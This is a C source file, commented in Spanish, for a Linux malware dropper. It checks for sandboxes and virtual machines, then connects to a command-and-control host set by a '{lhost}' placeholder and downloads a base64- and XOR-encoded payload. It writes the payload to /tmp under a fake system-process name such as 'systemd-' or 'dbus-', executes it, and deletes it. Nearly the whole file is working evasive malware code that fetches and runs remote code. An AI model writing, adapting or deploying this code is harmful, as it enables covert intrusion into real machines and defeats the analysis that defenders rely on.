#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/syscall.h>
#include <linux/limits.h>
#include <signal.h> 
// === CONFIGURACIÓN ===
#define C2_HOST "{lhost}"
#define C2_PORT 80
#define C2_PATH "/beacon.enc"
#define XOR_KEY 0x33
#define MAX_PAYLOAD_SIZE (10 * 1024 * 1024) // 10 MB

// === SYSCALL WRAPPERS ===
long sys_write(int fd, const void *buf, size_t count) {
    long ret;
    asm volatile ("syscall"
        : "=a" (ret)
        : "a" (1), "D" (fd), "S" (buf), "d" (count)
        : "rcx", "r11", "memory");
    return ret;
}

long sys_read(int fd, void *buf, size_t count) {
    long ret;
    asm volatile ("syscall"
        : "=a" (ret)
        : "a" (0), "D" (fd), "S" (buf), "d" (count)
        : "rcx", "r11", "memory");
    return ret;
}

long sys_open(const char *pathname, int flags, mode_t mode) {
    long ret;
    asm volatile ("syscall"
        : "=a" (ret)
        : "a" (2), "D" (pathname), "S" (flags), "d" (mode)
        : "rcx", "r11", "memory");
    return ret;
}

long sys_close(int fd) {
    long ret;
    asm volatile ("syscall"
        : "=a" (ret)
        : "a" (3), "D" (fd)
        : "rcx", "r11", "memory");
    return ret;
}

long sys_socket(int domain, int type, int protocol) {
    long ret;
    asm volatile ("syscall"
        : "=a" (ret)
        : "a" (41), "D" (domain), "S" (type), "d" (protocol)
        : "rcx", "r11", "memory");
    return ret;
}

long sys_connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
    long ret;
    asm volatile ("syscall"
        : "=a" (ret)
        : "a" (42), "D" (sockfd), "S" (addr), "d" (addrlen)
        : "rcx", "r11", "memory");
    return ret;
}

long sys_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset) {
    long ret;
    asm volatile ("syscall"
        : "=a" (ret)
        : "a" (9), "D" (addr), "S" (length), "d" (prot), "r" (flags), "r" (fd), "r" (offset)
        : "rcx", "r11", "memory");
    return ret;
}

long sys_munmap(void *addr, size_t length) {
    long ret;
    asm volatile ("syscall"
        : "=a" (ret)
        : "a" (11), "D" (addr), "S" (length)
        : "rcx", "r11", "memory");
    return ret;
}

long sys_unlink(const char *pathname) {
    long ret;
    asm volatile ("syscall"
        : "=a" (ret)
        : "a" (87), "D" (pathname)
        : "rcx", "r11", "memory");
    return ret;
}

long sys_execve(const char *filename, char *const argv[], char *const envp[]) {
    long ret;
    asm volatile ("syscall"
        : "=a" (ret)
        : "a" (59), "D" (filename), "S" (argv), "d" (envp)
        : "rcx", "r11", "memory");
    return ret;
}

long sys_exit(int status) {
    asm volatile ("syscall" :: "a"(60), "D"(status) : "rcx", "r11", "memory");
    __builtin_unreachable();
}

// === FUNCIONES AUXILIARES ===
void xor_data(unsigned char* data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= XOR_KEY;
    }
}

// Base64 decode básico 
int base64_index(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

int base64_decode(const char* in, size_t in_len, unsigned char** out) {
    if (in_len % 4 != 0) return 0;

    size_t out_len = in_len / 4 * 3;
    if (in[in_len - 1] == '=') out_len--;
    if (in[in_len - 2] == '=') out_len--;

    unsigned char* decoded = malloc(out_len);
    if (!decoded) return 0;

    int i, j = 0;
    for (i = 0; i < in_len; i += 4) {
        int quad[4];
        for (int k = 0; k < 4; k++) {
            if (i + k >= in_len || in[i + k] == '=') {
                quad[k] = 0;
            } else {
                quad[k] = base64_index(in[i + k]);
                if (quad[k] == -1) {
                    free(decoded);
                    return 0;
                }
            }
        }

        decoded[j++] = (quad[0] << 2) | (quad[1] >> 4);
        if (j < out_len) decoded[j++] = ((quad[1] & 0xF) << 4) | (quad[2] >> 2);
        if (j < out_len) decoded[j++] = ((quad[2] & 0x3) << 6) | quad[3];
    }

    *out = decoded;
    return out_len;
}

// === ANTI-ANALYSIS ===
int anti_analysis() {
    // 1. RAM < 2GB
    FILE* f = fopen("/proc/meminfo", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "MemTotal:", 9) == 0) {
                long mem_kb;
                sscanf(line, "MemTotal: %ld kB", &mem_kb);
                if (mem_kb < 2 * 1024 * 1024) { // < 2GB
                    fclose(f);
                    return 1;
                }
                break;
            }
        }
        fclose(f);
    }

    // 2. VM detection
    if (access("/usr/bin/vmware-toolbox-cmd", F_OK) == 0 ||
        access("/proc/xen", F_OK) == 0 ||
        access("/sys/hypervisor/type", F_OK) == 0) {
        return 1;
    }

    // 3. Uptime < 60 seg
    f = fopen("/proc/uptime", "r");
    if (f) {
        double uptime;
        fscanf(f, "%lf", &uptime);
        fclose(f);
        if (uptime < 60.0) return 1;
    }

    return 0;
}

// === DESCARGA MANUAL CON SOCKETS ===
unsigned char* download_payload(size_t* out_len) {
    // Jitter: 10–25 segundos
    unsigned int seed = (unsigned int)syscall(SYS_time, NULL);
    seed ^= (unsigned int)syscall(SYS_getpid);
    for (int i = 0; i < (rand_r(&seed) % 15000 + 10000); i++) {
        asm volatile ("nop");
    }

    int sock = sys_socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return NULL;

    struct sockaddr_in serv_addr = {0};
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(C2_PORT);
    serv_addr.sin_addr.s_addr = inet_addr(C2_HOST);

    if (sys_connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        sys_close(sock);
        return NULL;
    }

    char request[512];
    snprintf(request, sizeof(request),
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\n"
        "Connection: close\r\n\r\n",
        C2_PATH, C2_HOST);

    sys_write(sock, request, strlen(request));

    unsigned char* buffer = malloc(MAX_PAYLOAD_SIZE);
    if (!buffer) {
        sys_close(sock);
        return NULL;
    }

    size_t total = 0;
    ssize_t n;
    while ((n = sys_read(sock, buffer + total, 4096)) > 0) {
        total += n;
        if (total >= MAX_PAYLOAD_SIZE) break;
    }
    sys_close(sock);

    // Buscar inicio del cuerpo (después de \r\n\r\n)
    char* body = (char*)buffer;
    char* header_end = strstr(body, "\r\n\r\n");
    if (!header_end) {
        free(buffer);
        return NULL;
    }
    body = header_end + 4;

    size_t body_len = total - (body - (char*)buffer);

    unsigned char* payload = malloc(body_len + 1);
    if (!payload) {
        free(buffer);
        return NULL;
    }
    memcpy(payload, body, body_len);
    payload[body_len] = 0;

    free(buffer);
    *out_len = body_len;
    return payload;
}

// === MAIN ===
int main() {
    if (anti_analysis()) sys_exit(1);

    size_t enc_len;
    unsigned char* enc_data = download_payload(&enc_len);
    if (!enc_data) sys_exit(1);

    unsigned char* raw_payload;
    int raw_len = base64_decode((char*)enc_data, enc_len, &raw_payload);
    free(enc_data);

    if (raw_len <= 0) sys_exit(1);

    xor_data(raw_payload, raw_len);

    // Nombre realista
    char temp_dir[] = "/tmp/";
    char* prefixes[] = { "systemd-", "dbus-", "upstart-", "gnome-", "pulse-" };
    char target_path[256];
    snprintf(target_path, sizeof(target_path), "%s%s%d", temp_dir,
             prefixes[rand() % 5], rand() % 1000);

    int fd = sys_open(target_path, O_CREAT | O_WRONLY | O_TRUNC, 0700);
    if (fd < 0) {
        free(raw_payload);
        sys_exit(1);
    }

    sys_write(fd, raw_payload, raw_len);
    sys_close(fd);
    free(raw_payload);

    // Ejecutar
    pid_t pid = syscall(SYS_clone, SIGCHLD, NULL);
    if (pid == 0) {
        // Hijo
        char* argv[] = { target_path, NULL };
        sys_execve(target_path, argv, NULL);
        sys_exit(1);
    } else if (pid > 0) {
        syscall(SYS_nanosleep, &(struct timespec){.tv_sec = 2}, NULL);
        sys_unlink(target_path); // Borrar
    }

    sys_exit(0);
}